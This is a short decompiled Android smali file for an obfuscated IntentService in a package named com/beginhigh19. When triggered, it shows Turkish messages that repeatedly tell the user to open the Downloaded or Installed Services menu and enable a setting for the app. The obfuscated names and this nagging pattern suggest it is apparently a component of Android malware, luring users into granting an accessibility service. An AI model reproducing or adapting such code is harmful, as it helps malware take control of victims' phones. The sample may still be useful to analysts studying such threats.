.class public Lcom/beginhigh19/p071p;
.super Landroid/app/IntentService;
.source "SourceFile"


# direct methods
.method public constructor <init>()V
    .locals 1

    const-string v0, "p071p"

    invoke-direct {p0, v0}, Landroid/app/IntentService;-><init>(Ljava/lang/String;)V

    return-void
.end method


# virtual methods
.method protected onHandleIntent(Landroid/content/Intent;)V
    .locals 2

    invoke-static {}, Lfddo/goto;->grethwjrsfhj()Z

    move-result p1

    if-eqz p1, :cond_0

    const-string p1, "\u0130ndirilen Servisler men\u00fcs\u00fcn\u00fc a\u00e7\u0131n;  L\u00fctfen %APP% ayar\u0131n\u0131 etkinle\u015ftirin"

    goto :goto_0

    :cond_0
    invoke-static {}, Lfddo/goto;->adgpkhmdsapfghmaepfmdhgpasdm()Z

    move-result p1

    if-eqz p1, :cond_1

    const-string p1, "Y\u00fckl\u00fc Servisler men\u00fcs\u00fcn\u00fc a\u00e7\u0131n; L\u00fctfen %APP% ayar\u0131n\u0131 etkinle\u015ftirin"

    goto :goto_0

    :cond_1
    const-string p1, "L\u00fctfen %APP% ayar\u0131n\u0131 etkinle\u015ftirin"

    :goto_0
    invoke-static {p0}, Lfddo/goto;->super(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "%APP%"

    invoke-virtual {p1, v1, v0}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p0}, Landroid/app/IntentService;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0, p1}, Lfddo/goto;->o(Landroid/content/Context;Ljava/lang/String;)V

    return-void
.end method
